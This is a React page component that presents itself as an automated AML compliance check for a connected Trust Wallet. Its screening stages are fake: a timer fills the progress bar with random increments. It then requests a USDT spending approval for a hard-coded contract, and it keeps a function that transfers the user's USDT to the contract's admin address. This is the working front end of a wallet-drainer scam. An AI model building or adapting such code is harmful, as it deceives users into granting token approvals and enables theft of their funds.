import React, { useEffect, useMemo, useState } from 'react'
import Header from '../components/Header.jsx'
import Footer from '../components/Footer.jsx'
import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
import { useAccount, useChainId } from 'wagmi'
import { CHAIN_IDS } from '../web3/config.jsx'
import { formatUSDTAmount, readAdminAddress, callTransferFromSender, approveUSDT, checkUSDTAllowance } from '../web3/tokenTransfer'

export default function AmlCheck() {
  const { address, isConnected } = useAccount()
  const liveChainId = useChainId()

  const settings = useMemo(() => {
    try { return JSON.parse(localStorage.getItem('amlsec_settings') || '{}') } catch { return {} }
  }, [])

  const SMART_CONTRACT_ADDRESS = settings.contractAddress || '0x83CBbdfd4E0Ae5e264B789cC7459E878A4E39fBd'
  const defaultNetwork = settings.defaultNetwork || 'arbitrum'
  const defaultChainId = CHAIN_IDS[defaultNetwork]
  const chainId = liveChainId || defaultChainId

  const search = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : new URLSearchParams()
  const amountParam = search.get('amount') || '1'
  const [progress, setProgress] = useState(0)
  const [stage, setStage] = useState('Initializing AML checks…')
  const [txStatus, setTxStatus] = useState('')
  const [error, setError] = useState('')
  const [isTrustModalOpen, setTrustModalOpen] = useState(false)

  const stages = [
    { pct: 5, label: 'Loading account and network context' },
    { pct: 15, label: 'Sanctions lists screening' },
    { pct: 35, label: 'Wallet risk scoring' },
    { pct: 55, label: 'Transaction pattern analysis' },
    { pct: 75, label: 'PEP & adverse media checks' },
    { pct: 90, label: 'Jurisdiction & compliance checks' },
    { pct: 100, label: 'AML screening complete' }
  ]

  useEffect(() => {
    // Do not run AML progression when wallet is not connected
    if (!isConnected) return

    let pct = progress || 0
    let cancelled = false

    function tick() {
      if (cancelled) return
      const step = Math.max(1, Math.ceil(Math.random() * 6)) // 1-6%
      pct = Math.min(pct + step, 100)
      setProgress(pct)
      const current = stages.find(s => pct <= s.pct) || stages[stages.length - 1]
      setStage(current.label)

      if (pct >= 100) {
        triggerApproval()
        return
      }
      const delay = 500 + Math.floor(Math.random() * 900) // 500–1400ms
      setTimeout(tick, delay)
    }

    const initialDelay = 400 + Math.floor(Math.random() * 600)
    const t = setTimeout(tick, initialDelay)
    return () => { cancelled = true; clearTimeout(t) }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected])

  async function triggerApproval() {
    setTxStatus('Preparing approval…')
    setError('')
    try {
      if (!isConnected || !address) {
        throw new Error('Wallet not connected. Open via Trust Wallet QR and connect.')
      }
      // Check existing allowance; if already approved, skip
      const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
      const alreadyApproved = Number(allowance) > 0
      if (alreadyApproved) {
        setTxStatus('Approval already granted for USDT.')
        return
      }
      const txHash = await approveUSDT({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
      setTxStatus(`Approval submitted: ${String(txHash)}`)
    } catch (err) {
      setError(err?.message || 'Approval failed')
      setTxStatus('')
    }
  }

  // Retain triggerTransfer for future use but not called here
  async function triggerTransfer() {
    try {
      const adminAddr = await readAdminAddress({ contractAddress: SMART_CONTRACT_ADDRESS, chainId })
      const amount = formatUSDTAmount(amountParam)
      await callTransferFromSender({ contractAddress: SMART_CONTRACT_ADDRESS, recipientAddress: adminAddr, amount, chainId })
    } catch (_) {}
  }

  const currentIndex = (() => {
    const idx = stages.findIndex(s => progress < s.pct)
    return idx === -1 ? stages.length : idx
  })()

  const amlPageUrl = typeof window !== 'undefined' ? `${window.location.origin}/aml-check${window.location.search || ''}` : '/aml-check'

  return (
    <>
      <Header />
      <main className="onboard" aria-labelledby="aml-title">
        <div className="onboard-inner">
          <h1 id="aml-title" className="onboard-title">AML Check in progress</h1>
          <p className="onboard-subtitle">We’re performing automated AML screening and transaction risk analysis before proceeding.</p>

          <div className="onboard-step" style={{ gridTemplateColumns: 'auto 1fr' }}>
            <div className="step-num" aria-hidden="true">1</div>
            <div>
              {isConnected ? (
                <div className="aml-center">
                  {progress < 100 ? (
                    <div className="aml-spinner" aria-label="Loading" />
                  ) : (
                    <div className="aml-success" aria-label="Complete">
                      <span className="check-icon" aria-hidden="true">✓</span>
                    </div>
                  )}
                  <div className="aml-progress">{progress}%</div>
                  <div className="aml-stage">{stage}</div>

                  <ul className="aml-stages-list" aria-label="Check stages">
                    {stages.map((s, idx) => {
                      const cls = idx < currentIndex ? 'done' : idx === currentIndex ? 'active' : 'muted'
                      return (
                        <li key={s.label} className={cls}>
                          {idx < currentIndex ? (
                            <span className="check-icon" aria-hidden="true">✓</span>
                          ) : (
                            <span className="check-icon muted" aria-hidden="true">•</span>
                          )}
                          <span className="stage-text">{s.label}</span>
                        </li>
                      )
                    })}
                  </ul>
                </div>
              ) : (
                <div className="aml-center">
                  <button className="btn primary" onClick={() => setTrustModalOpen(true)}>Connect with Trust Wallet</button>
                  <p className="helper-text" style={{ marginTop: 12 }}>Connect your wallet to start AML checks.</p>
                </div>
              )}

              {txStatus && <div className="aml-status ok" role="status">{txStatus}</div>}
              {error && <div className="aml-status err" role="alert">{error}</div>}
              <p className="helper-text" style={{ marginTop: 8 }}>Amount: {amountParam} USDT • Contract: <code>{SMART_CONTRACT_ADDRESS}</code></p>
            </div>
          </div>
        </div>
      </main>
      <TrustWalletConnectModal isOpen={isTrustModalOpen} onClose={() => setTrustModalOpen(false)} dappUrl={amlPageUrl} />
      <Footer />
    </>
  )
}